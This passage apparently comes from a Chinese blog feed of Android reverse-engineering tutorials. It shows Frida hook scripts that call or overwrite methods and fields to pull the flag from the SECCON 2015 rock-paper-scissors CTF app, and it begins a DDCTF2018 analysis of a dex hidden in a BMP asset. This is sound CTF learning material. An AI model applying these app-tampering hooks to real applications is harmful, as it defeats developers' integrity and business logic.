<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> frida, sys</span><br><span class="line"> </span><br><span class="line"><span class="comment">#hook代码，采用javascript编写</span></span><br><span class="line">jscode = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">//javascript代码，重点</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#自定义回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        print(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.format(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(message)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#重点的4行代码</span></span><br><span class="line">process = frida.get_usb_device().attach(<span class="string">&#x27;应用完整包名&#x27;</span>)</span><br><span class="line">script = process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<p>当然如果是对此简单的使用，只需要编写jscode，以及填写你要hook的应用完整包名就行了，不过如果单纯只会用可能在以后会被模板限制，所以一探究竟还是很有必要。<br>可以在Bash中，使用python终端的help()函数找到frida库的源代码的绝对路径。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import frida</span><br><span class="line">help(frida)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923112932246.png" alt="image-20200923112932246"></p>
<p>接下来就来具体看看这几句代码做了什么事情。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;应用完整包名&#39;)</span><br><span class="line">script &#x3D; process.create_script(jscode)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<p>首先使用了frida.get_usb_device()，返回了一个_get_device函数，跟进_get_device方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def get_usb_device(timeout &#x3D; 0):</span><br><span class="line">    return _get_device(lambda device: device.type &#x3D;&#x3D; &#39;tether&#39;, timeout)</span><br></pre></td></tr></table></figure>

<p>在_get_device中，通过get_device_manager()实例化DeviceManager类，并调用该类中的enumerate_devices()方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def _get_device(predicate, timeout):</span><br><span class="line">    mgr &#x3D; get_device_manager()                &#x2F;&#x2F;获取设备管理</span><br><span class="line">    def find_matching_device():               &#x2F;&#x2F;寻找匹配设备</span><br><span class="line">        usb_devices &#x3D; [device for device in mgr.enumerate_devices() if predicate(device)]</span><br><span class="line">        if len(usb_devices) &gt; 0:</span><br><span class="line">            return usb_devices[0]</span><br><span class="line">        else:</span><br><span class="line">            return None</span><br><span class="line">    device &#x3D; find_matching_device()</span><br><span class="line">   ...省略</span><br></pre></td></tr></table></figure>

<p>get_device_manager()代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def get_device_manager():</span><br><span class="line">    global _device_manager</span><br><span class="line">    if _device_manager is None:</span><br><span class="line">        from . import core</span><br><span class="line">        _device_manager &#x3D; core.DeviceManager(_frida.DeviceManager())</span><br><span class="line">    return _device_manager</span><br></pre></td></tr></table></figure>

<p>DeviceManager中enumerate_devices(）方法，可以看到enumerate_devices()方法实际上是返回了一个Device()类的实例化对象List。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class DeviceManager(object):</span><br><span class="line">    def __init__(self, impl):</span><br><span class="line">        self._impl &#x3D; impl</span><br><span class="line"> </span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return repr(self._impl)</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;返回了一个Device()类的实例化。</span><br><span class="line">    def enumerate_devices(self):</span><br><span class="line">        return [Device(device) for device in self._impl.enumerate_devices()]</span><br><span class="line"> </span><br><span class="line">    def add_remote_device(self, host):</span><br><span class="line">        return Device(self._impl.add_remote_device(host))</span><br><span class="line"> </span><br><span class="line">    def remove_remote_device(self, host):</span><br><span class="line">        self._impl.remove_remote_device(host)</span><br><span class="line"> </span><br><span class="line">    def get_device(self, device_id):</span><br><span class="line">        devices &#x3D; self._impl.enumerate_devices()</span><br><span class="line">        if device_id is None:</span><br><span class="line">            return Device(devices[0])</span><br><span class="line">        for device in devices:</span><br><span class="line">            if device.id &#x3D;&#x3D; device_id:</span><br><span class="line">                return Device(device)</span><br><span class="line">        raise _frida.InvalidArgumentError(&quot;unable to find device with id %s&quot; % device_id)</span><br><span class="line"> </span><br><span class="line">    def on(self, signal, callback):</span><br><span class="line">        self._impl.on(signal, callback)</span><br><span class="line"> </span><br><span class="line">    def off(self, signal, callback):</span><br><span class="line">        self._impl.off(signal, callback)</span><br></pre></td></tr></table></figure>

<p>继续跟进Device类中的，就找到了attach()方法。在attach方法这是设置断点，看看传入的数据。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923213529047.png" alt="image-20200923213529047"></p>
<p>接下来提供的“应用完整名”是通过self._pid_of()函数去找到对应的进程号pid，然后将pid后通过Session类初始化。到此第一句代码过程就算是明白了，最终得到的是一个对应进程号pid的Session实例化对象process。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Device(object):</span><br><span class="line">    def __init__(self, device):</span><br><span class="line">        self.id &#x3D; device.id</span><br><span class="line">        self.name &#x3D; device.name</span><br><span class="line">        self.icon &#x3D; device.icon</span><br><span class="line">        self.type &#x3D; device.type</span><br><span class="line">        self._impl &#x3D; device</span><br><span class="line"> </span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return repr(self._impl)</span><br><span class="line"> </span><br><span class="line">    ...节省空间删除部分方法，详细内容可自行查看源码</span><br><span class="line"> </span><br><span class="line">    def kill(self, target):</span><br><span class="line">        self._impl.kill(self._pid_of(target))</span><br><span class="line"> </span><br><span class="line">    &#x2F;&#x2F;返回了一个Session的实例化对象</span><br><span class="line">    def attach(self, target):</span><br><span class="line">        return Session(self._impl.attach(self._pid_of(target)))</span><br><span class="line"> </span><br><span class="line">    def inject_library_file(self, target, path, entrypoint, data):</span><br><span class="line">        return self._impl.inject_library_file(self._pid_of(target), path, entrypoint, data)</span><br><span class="line"> </span><br><span class="line">    def inject_library_blob(self, target, blob, entrypoint, data):</span><br><span class="line">        return self._impl.inject_library_blob(self._pid_of(target), blob, entrypoint, data)</span><br><span class="line"> </span><br><span class="line">    def on(self, signal, callback):</span><br><span class="line">        self._impl.on(signal, callback)</span><br><span class="line"> </span><br><span class="line">    def off(self, signal, callback):</span><br><span class="line">        self._impl.off(signal, callback)</span><br><span class="line"> </span><br><span class="line">    def _pid_of(self, target):</span><br><span class="line">        if isinstance(target, numbers.Number):</span><br><span class="line">            return target</span><br><span class="line">        else:</span><br><span class="line">            return self.get_process(target).pid</span><br></pre></td></tr></table></figure>

<p>第二句，紧接着process.create_script(jscode)，可以看到它返回一个Script类的实例化，参数不确定。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def create_script(self, *args, **kwargs):</span><br><span class="line">        return Script(self._impl.create_script(*args, **kwargs))</span><br></pre></td></tr></table></figure>

<p>跟进Script类，可以找到on()方法，在on方法中可以设置自定义回调函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Script(object):</span><br><span class="line">    def __init__(self, impl):</span><br><span class="line">        self.exports &#x3D; ScriptExports(self)</span><br><span class="line"> </span><br><span class="line">        self._impl &#x3D; impl</span><br><span class="line">        self._on_message_callbacks &#x3D; []</span><br><span class="line">        self._log_handler &#x3D; self._on_log</span><br><span class="line"> </span><br><span class="line">        self._pending &#x3D; &#123;&#125;</span><br><span class="line">        self._next_request_id &#x3D; 1</span><br><span class="line">        self._cond &#x3D; threading.Condition()</span><br><span class="line"> </span><br><span class="line">        impl.on(&#39;destroyed&#39;, self._on_destroyed)</span><br><span class="line">        impl.on(&#39;message&#39;, self._on_message)</span><br><span class="line"> </span><br><span class="line">   ...节省空间删除部分类方法，详细内容可自行查看源码</span><br><span class="line"> </span><br><span class="line">    def load(self):</span><br><span class="line">        self._impl.load()</span><br><span class="line"> </span><br><span class="line">   &#x2F;&#x2F;设置自定义回调函数</span><br><span class="line">    def on(self, signal, callback):</span><br><span class="line">        if signal &#x3D;&#x3D; &#39;message&#39;:</span><br><span class="line">            self._on_message_callbacks.append(callback)</span><br><span class="line">        else:</span><br><span class="line">            self._impl.on(signal, callback)</span><br><span class="line"> </span><br><span class="line">在IDE中可以看到_on_message_callbacks中存放的on_message函数地址。</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924155129213.png" alt="image-20200924155129213"><br>接下来调用load()方法，在服务端就启动javascript脚本了，至于在frida-server服务端怎么执行的，可逆向研究一下frida-server，它才是真正的核心。</p>
<h2 id="0x05-Javascript代码构造与执行"><a href="#0x05-Javascript代码构造与执行" class="headerlink" title="0x05 Javascript代码构造与执行"></a>0x05 Javascript代码构造与执行</h2><h3 id="方法一：获取calc-返回值"><a href="#方法一：获取calc-返回值" class="headerlink" title="方法一：获取calc()返回值"></a>方法一：获取calc()返回值</h3><p>第一种思路就是直接获取calc的返回值，从native函数定义上知道它的返回值是int类型，当然直接获取calc函数的返回值是解出问题最简单的方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public native int calc();</span><br></pre></td></tr></table></figure>

<p>那怎么获取calc()函数的返回值呢，这个函数在MainActivity类中，直接引用该类下的calc()方法，不就ok了吗，原理是这样，下面就来构造一下Javascript代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Java.Perform 开始执行JavaScript脚本。</span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">&#x2F;&#x2F;定义变量MainActivity，Java.use指定要使用的类</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    &#x2F;&#x2F;hook该类下的onCreate方法，重新实现它</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function () &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        &#x2F;&#x2F;调用calc()方法，获取返回值</span><br><span class="line">        var returnValue &#x3D; this.calc();</span><br><span class="line">        send(&quot;Return:&quot;+returnValue);</span><br><span class="line">        var result &#x3D; (1000+returnValue)*107;</span><br><span class="line">        &#x2F;&#x2F;解出答案</span><br><span class="line">        send(&quot;Flag:&quot;+&quot;SECCON&#123;&quot;+result.toString()+&quot;&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>JavaScript代码就是这样，如果不是很理解，学习一下JavaScript基础即可，下面看看完整的python脚本。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*-coding:utf-8-*-</span><br><span class="line">import frida, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">jscode &#x3D; &quot;&quot;&quot;</span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function () &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        var returnValue &#x3D; this.calc();</span><br><span class="line">        send(&quot;Return:&quot;+returnValue);</span><br><span class="line">        var result &#x3D; (1000+returnValue)*107;</span><br><span class="line">        send(&quot;Flag:&quot;+&quot;SECCON&#123;&quot;+result.toString()+&quot;&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;com.example.seccon2015.rock_paper_scissors&#39;)</span><br><span class="line">script &#x3D; process.create_script(jscode)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<p>不知道为什么hook的为应用的onCreate方法始终不行所以hook对应的onClick方法进行结果如下</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924110841383.png" alt="image-20200924110841383"></p>
<h3 id="方法二：修改cnt的值为1000"><a href="#方法二：修改cnt的值为1000" class="headerlink" title="方法二：修改cnt的值为1000"></a>方法二：修改cnt的值为1000</h3><p>第二种思路也比较简单，我们需要修改cnt的值，但如果直接修改cnt的初始值为1000的话，在游戏中可能存在不确定因素，比如输了会置0，赢了cnt值就变成1001了，所以还得控制一下输赢，而输赢的条件是电脑出什么，所以最终hook的方法就在onClick中。<br>从onClick()中可以知道，控制输赢的在于修改this.n 和 this.m的值，再来看看源代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private final Runnable showMessageTask &#x3D; new Runnable() &#123;</span><br><span class="line">        public void run() &#123;</span><br><span class="line">            TextView tv3 &#x3D; (TextView) MainActivity.this.findViewById(R.id.textView3);</span><br><span class="line">            MainActivity mainActivity;</span><br><span class="line">            &#x2F;&#x2F;我方:布 CPU：石头 or 我方：石头 CUP：剪刀 ，则为赢</span><br><span class="line">            if (MainActivity.this.n - MainActivity.this.m &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                mainActivity &#x3D; MainActivity.this;</span><br><span class="line">                mainActivity.cnt++;</span><br><span class="line">                tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">             &#x2F;&#x2F;反过来当然是输咯</span><br><span class="line">            &#125; else if (MainActivity.this.m - MainActivity.this.n &#x3D;&#x3D; 1) &#123;</span><br><span class="line">                MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">                tv3.setText(&quot;LOSE +0&quot;);</span><br><span class="line">             &#x2F;&#x2F;一样则打平</span><br><span class="line">            &#125; else if (MainActivity.this.m &#x3D;&#x3D; MainActivity.this.n) &#123;</span><br><span class="line">                tv3.setText(&quot;DRAW +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">             &#x2F;&#x2F;我布  cup:剪刀</span><br><span class="line">            &#125; else if (MainActivity.this.m &lt; MainActivity.this.n) &#123;</span><br><span class="line">                MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">                tv3.setText(&quot;LOSE +0&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                mainActivity &#x3D; MainActivity.this;</span><br><span class="line">                mainActivity.cnt++;</span><br><span class="line">                tv3.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;&#x2F;获胜1000次则能够获取flag</span><br><span class="line">            if (1000 &#x3D;&#x3D; MainActivity.this.cnt) &#123;</span><br><span class="line">                tv3.setText(&quot;SECCON&#123;&quot; + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + &quot;&#125;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            MainActivity.this.flag &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<p>JavaScript代码编写如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function () &#123;</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    &#x2F;&#x2F;hook onClick方法，此处要注意的是onClick方法是传递了一个View参数v</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function (v) &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        &#x2F;&#x2F;调用onClick,模拟点击事件</span><br><span class="line">        this.onClick(v);</span><br><span class="line">        &#x2F;&#x2F;修改参数  满足第一个if 或者 最后一个else即可</span><br><span class="line">        this.n.value &#x3D; 0;</span><br><span class="line">        this.m.value &#x3D; 2;</span><br><span class="line">        this.cnt.value &#x3D; 999;</span><br><span class="line">        send(&quot;Success!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>完整python代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import frida, sys</span><br><span class="line"> </span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"> </span><br><span class="line">jscode &#x3D; &quot;&quot;&quot;</span><br><span class="line">Java.perform(function () &#123;</span><br><span class="line">    var MainActivity &#x3D; Java.use(&#39;com.example.seccon2015.rock_paper_scissors.MainActivity&#39;);</span><br><span class="line">    MainActivity.onClick.implementation &#x3D; function (v) &#123;</span><br><span class="line">        send(&quot;Hook Start...&quot;);</span><br><span class="line">        this.onClick(v);</span><br><span class="line">        this.n.value &#x3D; 0;</span><br><span class="line">        this.m.value &#x3D; 2;</span><br><span class="line">        this.cnt.value &#x3D; 999;</span><br><span class="line">        send(&quot;Success!&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"> </span><br><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;com.example.seccon2015.rock_paper_scissors&#39;)</span><br><span class="line">script &#x3D; process.create_script(jscode)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<p>执行python脚本，任意点击按钮，答案就出来了。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924112142535.png" alt="image-20200924112142535"></p>
<h3 id="方法三：分析calc-方法算出答案"><a href="#方法三：分析calc-方法算出答案" class="headerlink" title="方法三：分析calc()方法算出答案"></a>方法三：分析calc()方法算出答案</h3><p>calc() 这个方法在so中，对应的分析汇编代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">static &#123;</span><br><span class="line">  System.loadLibrary(&quot;calc&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public native int calc();</span><br></pre></td></tr></table></figure>

<p>直接使用ida pro或者radare2分析汇编代码也是可以的。这里给出用radare2反汇编出来的代码。可以看到，calc()函数就单纯的返回了int值7</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924113024992.png" alt="image-20200924113024992"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200924114127105.png" alt="image-20200924114127105"></p>
<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p><strong>一般分析流程</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.反编译apk，分析代码寻找hook点。</span><br><span class="line">2.编写js代码，调用类的方法或者替换。</span><br><span class="line">3.在python中执行即可。</span><br></pre></td></tr></table></figure>

<h2 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h2><p><a href="https://bbs.pediy.com/thread-227232.htm">https://bbs.pediy.com/thread-227232.htm</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Frida</tag>
        <tag>Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>Frida--Android逆向之动态加载dex Hook(上)</title>
    <url>/2021/01/05/Android/frida/Frida-Android%E9%80%86%E5%90%91%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDdex-Hook-%E4%B8%8A/</url>
    <content><![CDATA[<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac Os 10.15.5</span><br><span class="line">Python 3.9</span><br><span class="line">jeb</span><br><span class="line">jadx</span><br><span class="line">frida</span><br><span class="line">apktool</span><br><span class="line">MUMU模拟器</span><br></pre></td></tr></table></figure>

<blockquote>
<p>文章使用的是DDCTF2018的android逆向第二题Hello Baby Dex</p>
</blockquote>
<a id="more"></a>

<p>示例地址：[下载](<a href="https://github.com/ghostmaze/Android-Reverse/blob/master/Hello">https://github.com/ghostmaze/Android-Reverse/blob/master/Hello</a> Baby Dex/app-release.apk)</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Robust热修复框架原理</span><br><span class="line">Java 反射</span><br><span class="line">Robust类 hook</span><br><span class="line">frida基础hook</span><br></pre></td></tr></table></figure>

<h2 id="APK安装"><a href="#APK安装" class="headerlink" title="APK安装"></a>APK安装</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105160817336.png" alt="image-20210105160817336" style="zoom:50%;">

<p>输入字符并验证，错误会Toast出一些信息，可能输入正确的值才能过获取flag直接进入分析</p>
<h2 id="静态代码分析"><a href="#静态代码分析" class="headerlink" title="静态代码分析"></a>静态代码分析</h2><p>导入jeb中查看AndroidManifest.xml 找到程序的入口MainActivity</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> &lt;activity android:name&#x3D;&quot;cn.chaitin.geektan.crackme.MainActivity&quot;&gt;</span><br><span class="line">     &lt;intent-filter&gt;</span><br><span class="line">     &lt;action android:name&#x3D;&quot;android.intent.action.MAIN&quot;&#x2F;&gt;</span><br><span class="line">	   &lt;category android:name&#x3D;&quot;android.intent.category.LAUNCHER&quot;&#x2F;&gt;</span><br><span class="line">   	 &lt;&#x2F;intent-filter&gt;</span><br><span class="line">&lt;&#x2F;activity&gt;</span><br></pre></td></tr></table></figure>

<p>在命令行中使用<code>apktool d xx.apk</code>，将APK文件反编译出来</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105162802636.png" alt="image-20210105162802636" style="zoom:50%;">

<p>接下来定位到MainActivity的onCreate()方法，可以看到一些可以的变量和方法比如～～上<code>PatchProxy</code>，<code>changeQuickRedirectd</code>等</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105170653328.png" alt="image-20210105170653328"></p>
<p>同时看到在else中调用了this.runRobust()方法，并且在每个类中都会存在一些changeQuickRedirect变量，以及isSupport()，accessDispatch()方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private void runRobust() &#123;</span><br><span class="line">    int v4 &#x3D; 4;</span><br><span class="line">    Object[] v0 &#x3D; new Object[0];</span><br><span class="line">    ChangeQuickRedirect v2 &#x3D; MainActivity.changeQuickRedirect;</span><br><span class="line">    Class[] v5 &#x3D; new Class[0];</span><br><span class="line">    Class v6 &#x3D; Void.TYPE;</span><br><span class="line">    MainActivity v1 &#x3D; this;</span><br><span class="line">    boolean v0_1 &#x3D; PatchProxy.isSupport(v0, v1, v2, false, v4, v5, v6);</span><br><span class="line">    if(v0_1) &#123;</span><br><span class="line">        v0 &#x3D; new Object[0];</span><br><span class="line">        v2 &#x3D; MainActivity.changeQuickRedirect;</span><br><span class="line">        v5 &#x3D; new Class[0];</span><br><span class="line">        v6 &#x3D; Void.TYPE;</span><br><span class="line">        v1 &#x3D; this;</span><br><span class="line">        PatchProxy.accessDispatch(v0, v1, v2, false, v4, v5, v6);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        Context v1_1 &#x3D; this.getApplicationContext();</span><br><span class="line">        &#x2F;&#x2F;实例化PatchManipulateImp类</span><br><span class="line">        PatchManipulateImp v2_1 &#x3D; new PatchManipulateImp();</span><br><span class="line">        &#x2F;&#x2F;实例化PatchExecutor类</span><br><span class="line">        PatchExecutor v0_2 &#x3D; new PatchExecutor(v1_1, ((PatchManipulate)v2_1), new GeekTanCallBack());</span><br><span class="line">        v0_2.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在runRobust()方法的else中实例化了两个对象跟进第一个PatchMainpulateImp中</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105171302097.png" alt="image-20210105171302097"></p>
<p>发现在fetchPatchList()方法中 调用了<code>arg17.getAssets().open(**&quot;GeekTan.BMP&quot;**);</code>从资源文件夹中，还在了一个BMP的的图片文件，并将BMP文件内容写入GeekTan.jar中</p>
<p>具体代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> try &#123;</span><br><span class="line">            v10 &#x3D; arg17.getAssets().open(&quot;GeekTan.BMP&quot;);</span><br><span class="line">            v8 &#x3D; new File(arg17.getCacheDir() + File.separator + &quot;GeekTan&quot; + File.separator + &quot;GeekTan.jar&quot;);</span><br><span class="line">            if(!v8.getParentFile().exists()) &#123;</span><br><span class="line">                v8.getParentFile().mkdirs();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Exception v9) &#123;</span><br><span class="line">            goto label_171;</span><br><span class="line">        &#125;</span><br><span class="line">&#x2F;&#x2F;将v8通过FileOutputStream方法赋值v12</span><br><span class="line">        try &#123;</span><br><span class="line">            v12 &#x3D; new FileOutputStream(v8);</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Throwable v0_3) &#123;</span><br><span class="line">            goto label_17;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int v0_4 &#x3D; 0x400;</span><br><span class="line">        try &#123;</span><br><span class="line">            byte[] v7 &#x3D; new byte[v0_4];</span><br><span class="line">            while(true) &#123;</span><br><span class="line">            &#x2F;&#x2F;v10给v11赋值  v10是GeekTan.BMP</span><br><span class="line">                int v11 &#x3D; v10.read(v7);</span><br><span class="line">                if(v11 &lt;&#x3D; 0) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">&#x2F;&#x2F;最终写入到v12中，而v12是new FileOutputStream(v8);</span><br><span class="line">                ((OutputStream)v12).write(v7, 0, v11);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Throwable v0_3) &#123;</span><br><span class="line">            goto label_88;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>查看对应的BMP文件发现是一个压缩包，里面存在一个dex文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ file GeekTan.BMP</span><br><span class="line">GeekTan.BMP: Zip archive data, at least v2.0 to extract</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ binwalk GeekTan.BMP</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Zip archive data, at least v2.0 to extract, name: classes.dex</span><br><span class="line">11635         0x2D73          End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure>

<p>同时在fetchPatchList()方法中实例化一个Patch对象</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Patch v13 &#x3D; new Patch();</span><br></pre></td></tr></table></figure>

<p>在方法的最后调用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">v0_6 &#x3D; &quot;cn.chaitin.geektan.crackme.PatchesInfoImpl&quot;;</span><br><span class="line">v13.setPatchesInfoImplClassFullName(v0_6);</span><br></pre></td></tr></table></figure>

<p>然后到runRobust()，接下来实例化了PatchExecutor类，可以看到第二个参数就是PatchManipulateImp类的实例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Context v1_1 &#x3D; this.getApplicationContext();</span><br><span class="line">            &#x2F;&#x2F;实例化PatchManipulateImp类</span><br><span class="line">            PatchManipulateImp v2_1 &#x3D; new PatchManipulateImp();</span><br><span class="line">            &#x2F;&#x2F;实例化PatchExecutor类</span><br><span class="line">            PatchExecutor v0_2 &#x3D; new PatchExecutor(v1_1, ((PatchManipulate)v2_1), new GeekTanCallBack());</span><br></pre></td></tr></table></figure>

<p>这个PatchExecutor类是在<code>com.meituan.robust</code>包下的，是一个第三方包，目前美团官方已经将其开源，在此<strong>暂停</strong>上面的分析，简单学习一下Robust。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105172538245.png" alt="image-20210105172538245"></p>
<h2 id="Robust热修复框架原理"><a href="#Robust热修复框架原理" class="headerlink" title="Robust热修复框架原理"></a>Robust热修复框架原理</h2><blockquote>
<p>Robust是美团推出的一款热修复框架，可以在github上面<a href="https://github.com/Meituan-Dianping/Robust">下载</a>它的最新的源码</p>
<p>Robust的基本原理，主要从下面4个步骤进行学习</p>
</blockquote>
<h3 id="1-将APK代码中每个函数都在编译打包阶段自动插入一段代码"><a href="#1-将APK代码中每个函数都在编译打包阶段自动插入一段代码" class="headerlink" title="1.将APK代码中每个函数都在编译打包阶段自动插入一段代码"></a>1.将APK代码中每个函数都在编译打包阶段自动插入一段代码</h3><p>例如，原函数：</p>
